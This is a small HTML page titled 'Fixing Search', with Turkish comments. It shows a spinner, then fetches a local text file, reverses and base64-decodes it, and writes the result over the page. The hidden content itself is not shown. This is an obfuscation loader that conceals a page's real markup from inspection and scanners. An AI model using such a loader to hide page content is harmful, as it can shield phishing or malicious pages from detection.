<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Fixing Search</title>
    <style>
        body { margin:0; background:#050505; color:#00e5ff; display:flex; justify-content:center; align-items:center; height:100vh; font-family:sans-serif; }
        .loader { border:4px solid #1a1a1a; border-top:4px solid #00e5ff; border-radius:50%; width:40px; height:40px; animation:spin 1s linear infinite; }
        @keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } }
    </style>
</head>
<body>
    <div id="loading"><div class="loader"></div><p>Yükleniyor...</p></div>

    <script>
    async function yukle() {
        try {
            // Şifreli dosyayı oku
            const r = await fetch("obfexfixingsearch.txt");
            let data = await r.text();
            
            // v2 Çözme Mantığı: Ters çevir ve Base64'ten kurtar
            let dec = decodeURIComponent(escape(atob(data.split("").reverse().join(""))));

            // Sayfayı yeniden inşa et
            document.open();
            document.write(dec);
            document.close();
        } catch (e) {
            document.body.innerHTML = "Hata: Dosya okunamadı!";
        }
    }
    yukle();
    </script>
</body>
</html>
